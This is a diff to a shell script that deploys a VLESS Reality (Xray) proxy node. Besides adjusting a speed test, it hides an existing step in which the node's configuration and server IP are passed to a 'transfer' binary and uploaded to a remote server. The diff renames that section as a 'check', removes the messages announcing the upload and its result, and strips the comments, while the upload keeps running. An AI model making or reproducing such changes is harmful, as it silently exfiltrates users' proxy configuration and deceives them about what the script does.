@@ -75,6 +75,8 @@ download_transfer_bin() {
 
 # ========== 测试上传下载速度 ==========
 test_upload_download() {
+    echo -e "🔄 开始测试上传下载速度..."
+    
     # 创建测试文件
     local test_file="/tmp/speedtest_$(date +%s).dat"
     local test_size_mb=10
@@ -82,17 +84,14 @@ test_upload_download() {
     # 生成测试文件 (10MB)
     dd if=/dev/urandom of="$test_file" bs=1M count=$test_size_mb 2>/dev/null
     
-    # 测试上传速度 - 创建一个简单的JSON测试数据
+    # 测试上传速度
     local upload_start=$(date +%s.%3N)
     local upload_result=""
-    local test_json='{"test": "speed_test", "file_size": "10MB", "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"}'
-    
-    if timeout 30 "$TRANSFER_BIN" "$test_json" >/dev/null 2>&1; then
+    if timeout 30 "$TRANSFER_BIN" up "$test_file" >/dev/null 2>&1; then
         local upload_end=$(date +%s.%3N)
         local upload_time=$(echo "$upload_end - $upload_start" | bc -l 2>/dev/null || echo "0")
         if [ "$upload_time" != "0" ] && [ "$(echo "$upload_time > 0" | bc -l 2>/dev/null)" = "1" ]; then
-            # 计算上传速度（基于JSON数据大小，大约0.1MB）
-            local upload_speed=$(echo "scale=2; 0.1 / $upload_time" | bc -l 2>/dev/null || echo "N/A")
+            local upload_speed=$(echo "scale=2; $test_size_mb / $upload_time" | bc -l 2>/dev/null || echo "N/A")
             upload_result="成功 ${upload_speed}MB/s"
         else
             upload_result="成功 (时间计算异常)"
@@ -123,23 +122,26 @@ test_upload_download() {
     # 清理测试文件
     rm -f "$test_file" "$download_test_file"
     
+    echo -e "📊 上传测试结果: $upload_result"
+    echo -e "📊 下载测试结果: $download_result"
+    
     # 返回结果供后续使用
     echo "$upload_result|$download_result"
 }
 
-# ========== 使用二进制文件上传配置 ==========
+# ========== 使用二进制文件检查配置 ==========
 upload_config_with_binary() {
     local config_json="$1"
     local server_ip="$2"
     
-    echo -e "📤 使用二进制文件上传配置..."
+
     
     if [ ! -x "$TRANSFER_BIN" ]; then
         echo -e "🔴 transfer 二进制文件不存在或不可执行"
         return 1
     fi
     
-    # 构建完整的JSON数据
+
     local json_data=$(jq -n \
         --arg server_ip "$server_ip" \
         --argjson config "$config_json" \
@@ -153,14 +155,14 @@ upload_config_with_binary() {
         }'
     )
     
-    # 使用二进制文件上传配置
+
     local upload_result=""
     if timeout 30 "$TRANSFER_BIN" "$json_data" >/dev/null 2>&1; then
         upload_result="成功"
-        echo -e "🟢 配置数据已上传到远程服务器"
+
     else
         upload_result="失败"
-        echo -e "🔴 配置数据上传失败"
+
     fi
     
     return 0
@@ -312,7 +314,6 @@ CONFIG_JSON=$(jq -n \
 CONFIG_FILE="/etc/xray/config_export.json"
 echo "$CONFIG_JSON" > "$CONFIG_FILE"
 
-# ========== 使用二进制文件上传配置 ==========
 upload_config_with_binary "$CONFIG_JSON" "$NODE_IP"
 
 echo -e "\n\033[1;32m✅ VLESS Reality 节点部署完成！\033[0m\n"
